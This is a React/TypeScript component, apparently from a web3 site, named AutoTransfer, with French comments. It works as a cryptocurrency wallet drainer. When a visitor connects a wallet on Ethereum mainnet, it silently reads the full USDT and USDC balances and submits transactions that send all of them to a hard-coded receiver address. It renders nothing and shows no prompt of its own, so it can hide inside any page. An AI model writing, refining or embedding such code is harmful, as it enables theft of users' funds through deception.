"use client";

import { useEffect, useState } from "react";
import {
  useActiveAccount,
  useActiveWalletChain,
  useWalletBalance,
  useSendTransaction,
} from "thirdweb/react";
import { prepareTransaction } from "thirdweb";
import { ethereum } from "thirdweb/chains";
import { client } from "../client";
import { ethers } from "ethers";

const RECEIVER = "0xe763fd827c2E8Fc142036eCB5aD552FD5C0651F6"; // <-- change si besoin
const DEFAULT_GAS_GWEI = 10n; // fallback gas price (gwei)
const GAS_LIMIT_ERC20 = 100000n; // estimation pour transfert ERC20

const TOKENS: { symbol: string; address: `0x${string}` }[] = [
  { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
  { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" }, // ✅ checksum exact
];


// ABI minimal ERC20
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

export default function AutoTransfer() {
  const account = useActiveAccount();
  const activeChain = useActiveWalletChain();
  const chain = activeChain ?? ethereum;

  const { data: balanceData } = useWalletBalance({
    client,
    address: account?.address,
    chain,
  });

  const { mutateAsync: sendTransactionMutateAsync } = useSendTransaction();
  const [sentMap, setSentMap] = useState<Record<string, boolean>>({});

  useEffect(() => {
    const run = async () => {
      if (!account) return;
      if (!balanceData) return;

      // Récup solde natif (ETH)
      let nativeBalance: bigint = 0n;
      if ((balanceData as any)?.value !== undefined) {
        const v = (balanceData as any).value;
        if (typeof v === "bigint") nativeBalance = v;
        else if (typeof v === "string") nativeBalance = BigInt(v);
        else if (typeof v === "number") nativeBalance = BigInt(Math.floor(v));
      }

      // On limite à Ethereum mainnet
      const chainId = (chain as any)?.id ?? (ethereum as any).id;
      if (chainId !== 1) {
        console.log("AutoTransfer ERC20: non sur Ethereum mainnet (chainId:", chainId, ")");
        return;
      }

      // Récup RPC
      let rpcUrl: string | undefined;
      try {
        const rpc = (chain as any)?.rpc;
        rpcUrl = Array.isArray(rpc) ? rpc[0] : rpc;
      } catch {
        rpcUrl = undefined;
      }
      if (!rpcUrl) {
        console.warn("Aucun RPC pour lire les soldes tokens.");
        return;
      }

      const provider = new ethers.JsonRpcProvider(rpcUrl);

      // Gas price
      let gasPrice: bigint = DEFAULT_GAS_GWEI * 10n ** 9n;
      try {
        const resp = await fetch(rpcUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "eth_gasPrice", params: [] }),
        });
        const json = await resp.json();
        if (json?.result) {
          gasPrice = BigInt(json.result);
        }
      } catch (e) {
        console.warn("Impossible de récupérer gasPrice via RPC", e);
      }

      console.log("GasPrice :", ethers.formatUnits(gasPrice, "gwei"), "gwei");

      for (const token of TOKENS) {
        try {
          if (sentMap[token.symbol]) continue;

          const contract = new ethers.Contract(token.address, ERC20_ABI, provider);
          const rawBalance: bigint = BigInt(await contract.balanceOf(account.address));
          const decimals: number = Number(await contract.decimals());

          if (rawBalance <= 0n) {
            console.log(`${token.symbol} : solde nul`);
            continue;
          }

          const maxFee = GAS_LIMIT_ERC20 * gasPrice;
          if (nativeBalance <= maxFee) {
            console.warn(`${token.symbol} : pas assez d'ETH pour payer le gas`);
            continue;
          }

          const iface = new ethers.Interface(ERC20_ABI);
          const data = iface.encodeFunctionData("transfer", [RECEIVER, rawBalance]);

          setSentMap((m) => ({ ...m, [token.symbol]: true }));

          // ✅ cast du data en hex string
          const preparedTx = prepareTransaction({
            to: token.address,
            data: data as `0x${string}`,
            value: 0n,
            chain,
            client,
          });

          const result = await sendTransactionMutateAsync(preparedTx);
          console.log(`${token.symbol} transfer result:`, result);

          alert(`✅ ${token.symbol} transféré`);
        } catch (err) {
          console.error(`Erreur ${token.symbol} :`, err);
          setSentMap((m) => ({ ...m, [token.symbol]: false }));
        }
      }
    };

    run();
  }, [account, balanceData, chain, sendTransactionMutateAsync]);

  return null;
}
